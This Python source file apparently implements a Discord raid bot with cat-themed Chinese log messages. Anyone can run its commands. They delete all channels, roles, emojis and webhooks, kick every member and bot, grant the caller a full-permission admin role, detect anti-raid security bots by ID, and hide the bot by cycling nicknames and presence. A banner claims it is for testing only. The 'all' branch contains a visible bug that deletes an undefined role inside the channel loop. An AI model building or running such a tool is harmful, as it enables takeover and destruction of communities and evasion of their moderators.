import string
import discord
from discord.ext import commands
import random
import sys
import json
import logging
import asyncio


# set
with open('set.json', encoding="utf-8") as f:
    config = json.load(f)
hidemodbool = False


FORMAT = '[NEKO] %(asctime)s %(levelname)s: %(message)s'
logger = logging.getLogger('neko')
logger.setLevel(logging.INFO)

handler = logging.FileHandler('neko.log',encoding='utf-8')
handler.setFormatter(logging.Formatter(FORMAT))
logger.addHandler(handler)

hdr = logging.StreamHandler()
hdr.setFormatter(logging.Formatter(FORMAT))
logger.addHandler(hdr)
#logging.basicConfig(level=logging.INFO, filename='neko.log',encoding="utf-8",filemode='w', format=FORMAT)

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=config['Prefix'], intents=intents)
bot.remove_command("help")

Securitybots = [890966805043097641, 689766089567109158, 758592094964285441, 964546135576436776, 914978756077187153, 856741116912861276, 970356996157108324, 651095740390834176,
                841444375681695746, 934840128738848858, 536991182035746816, 916216591811751996, 916216591811751996, 913017451904663553, 919442864071643216, 876367835486646282]
muterole = ['mute','隔離']

@bot.event
async def on_ready():
    logger.info(f'Logged in as {bot.user.name}')
    sys.stdout.buffer.write(f'''\
      ___           ___           ___           ___     
     /  /\         /  /\         /  /\         /  /\       
    /  /::|       /  /::\       /  /:/        /  /::\      本bot僅於用於測試用途 
   /  /:|:|      /  /:/\:\     /  /:/        /  /:/\:\     如發生問題一概不負責
  /  /:/|:|__   /  /::\ \:\   /  /::\____   /  /:/  \:\    ฅ(≈>ܫ<≈)♥
 /__/:/ |:| /\ /__/:/\:\ \:\ /__/:/\:::::\ /__/:/ \__\:\   
 \__\/  |:|/:/ \  \:\ \:\_\/ \__\/~|:|~~~~ \  \:\ /  /:/
     |  |:/:/   \  \:\ \:\      |  |:|      \  \:\  /:/      
     |__|::/     \  \:\_\/      |  |:|       \  \:\/:/     warring: For Testing Only
     /__/:/       \  \:\        |__|:|        \  \::/      
     \__\/         \__\/         \__\|         \__\/       
    '''.encode('utf8'))
    print("\n")
    print("=================")
    print("喵喵已經上線了喔")
    print(f"{bot.user.name}")
    print("=================")


@bot.command(aliases=['c'])
async def clean(ctx, num: int):
    logger.info(f'{ctx.author} used clean command')
    await ctx.channel.purge(limit=num+1)


@bot.command(aliases=['b'])
async def boom(ctx):
    await ctx.message.delete()
    logger.info(f'{ctx.author} used boom command')
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            logger.info(f"喔不 {ctx.guild.name} 的 {channel.name} 頻道被刪了 喵!")
        except:
            logger.error(f"哦哦 {ctx.guild.name} 的 {channel.name} 頻道本喵無法刪除")
    logger.info(f'{ctx.guild.name} 的所有頻道被刪了')


@bot.command(aliases=['csb'])
async def check_securitybot(ctx):
    for i in ctx.guild.members:
        if i.id in Securitybots:
            logger.info(f"{i.name} 是安全機器人喔")
        else:
            logger.info(f"{i.name} 不是安全機器人喔")



@bot.command(aliases=['ga'])
async def get_admin(ctx):
    try:
        await ctx.guild.create_role(name="neko", permissions=discord.Permissions.all())
        await ctx.author.add_roles(discord.utils.get(ctx.guild.roles, name="neko"))
        await ctx.send("我已經給你一個管理員權限了喔 (｡･ω･｡)")
    except:
        await ctx.send("出現錯誤了喔 (｡･ω･｡)")


@bot.command(aliases=['sb'])
async def sampleboom(ctx, slect: str):
    logger.info(f'{ctx.author} used boom command mod:{slect}')
    if slect.lower() == "channels":
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
                logger.info(f"喔不 {ctx.guild.name} 的 {channel.name} 頻道被刪了 喵!")
            except:
                logger.error(f"哦哦 {ctx.guild.name} 的 {channel.name} 頻道本喵無法刪除")
        logger.info("已經刪除所有頻道了 喵!")
    elif slect.lower() == "roles":
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
                logger.info(f"喔不 {ctx.guild.name} 的 {role.name} 權限被刪了 喵!")
            except:
                logger.error(f"哦哦 {ctx.guild.name} 的 {role.name} 權限本喵無法刪除")
        logger.info("已經刪除所有權限了 喵!")
    elif slect.lower() == "emojis":
        for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                logger.info(f"喔不 {ctx.guild.name} 的 {emoji.name} 表情被刪了 喵!")
            except:
                logger.error(f"哦哦 {ctx.guild.name} 的 {emoji.name} 表情本喵無法刪除")
        logger.info("已經刪除所有表情了 喵!")

    elif slect.lower() == "members":
        for member in list(ctx.guild.members):
            try:
                await member.kick()
                logger.info(f"喔不 {ctx.guild.name} 的 {member.name} 人被踢掉了了 喵!")
            except:
                logger.error(f"哦哦 {ctx.guild.name} 的 {member.name} 會員本喵無法刪除")
        logger.info("已經刪除所有會員了 喵!")

    elif slect.lower() == "webhooks":
        for webhook in list(await ctx.guild.webhooks()):
            try:
                await webhook.delete()
                logger.info(
                    f"喔不 {ctx.guild.name} 的 {webhook.name} webhook被刪了 喵!")
            except:
                logger.error(
                    f"哦哦 {ctx.guild.name} 的 {webhook.name} webhook本喵無法刪除")
        logger.info("已經刪除所有webhook了 喵!")

    elif slect.lower() == "bots":
        for member in list(ctx.guild.members):
            if member.bot:
                try:
                    await member.kick()
                    logger.info(
                        f"喔不 {ctx.guild.name} 的 {member.name} 機器人被踢掉了了 喵!")
                except:
                    logger.error(
                        f"哦哦 {ctx.guild.name} 的 {member.name} 機器人本喵無法刪除")
        logger.info("已經刪除所有機器人了 喵!")

    elif slect.lower() == "all":
        for channel in list(ctx.guild.channels):
            try:
                await role.delete()
                logger.info(f"喔不 {ctx.guild.name} 的 {channel.name} 頻道被刪了 喵!")
            except:
                logger.error(f"哦哦 {ctx.guild.name} 的 {channel.name} 頻道本喵無法刪除")
        logger.info("已經刪除所有頻道了 喵!")
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
                logger.info(f"喔不 {ctx.guild.name} 的 {role.name} 權限被刪了 喵!")
            except:
                logger.error(f"哦哦 {ctx.guild.name} 的 {role.name} 權限本喵無法刪除")
        logger.info("已經刪除所有權限了 喵!")
        for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                logger.info(f"喔不 {ctx.guild.name} 的 {emoji.name} 表情被刪了 喵!")
            except:
                logger.error(f"哦哦 {ctx.guild.name} 的 {emoji.name} 表情本喵無法刪除")
        logger.info("已經刪除所有表情了 喵!")
        for webhook in list(await ctx.guild.webhooks()):
            try:
                await webhook.delete()
                logger.info(
                    f"喔不 {ctx.guild.name} 的 {webhook.name} webhook被刪了 喵!")
            except:
                logger.error(
                    f"哦哦 {ctx.guild.name} 的 {webhook.name} webhook本喵無法刪除")
        logger.info("已經刪除所有webhook了 喵!")
        for member in list(ctx.guild.members):
            try:
                await member.kick()
                logger.info(f"喔不 {ctx.guild.name} 的 {member.name} 人被踢掉了了 喵!")
            except:
                logger.error(f"哦哦 {ctx.guild.name} 的 {member.name} 會員本喵無法刪除")
        logger.info("已經刪除所有會員了 喵!")
        logger.info("已經幫伺服器做回收了~喵!")


@bot.command()
async def hidemod(ctx):
    global hidemodbool
    if not hidemodbool:
        hidemodbool = True
        logger.info("啟用隱藏模式了喔 喵!")
        try:
            gu = await bot.get_guild(int(config['guildid']))
        except:
            gu = ctx.guild
        while hidemodbool:
            if config['nick'] != []:
                await gu.me.edit(nick=random.choice(config['nick']))
            else:
                nick = "".join(random.choices(
                    string.ascii_letters + string.digits, k=random.randint(5, 10)))
                await gu.me.edit(nick=nick)
            await bot.change_presence(status=discord.Status.online)
            await asyncio.sleep(random.uniform(0, 3) + 0.5)
            await bot.change_presence(status=discord.Status.offline)
            await asyncio.sleep(random.uniform(0, 3) + 1)
    else:
        hidemodbool = False
        logger.info("停用隱藏模式了喔 喵!")


bot.run(config['Token'])
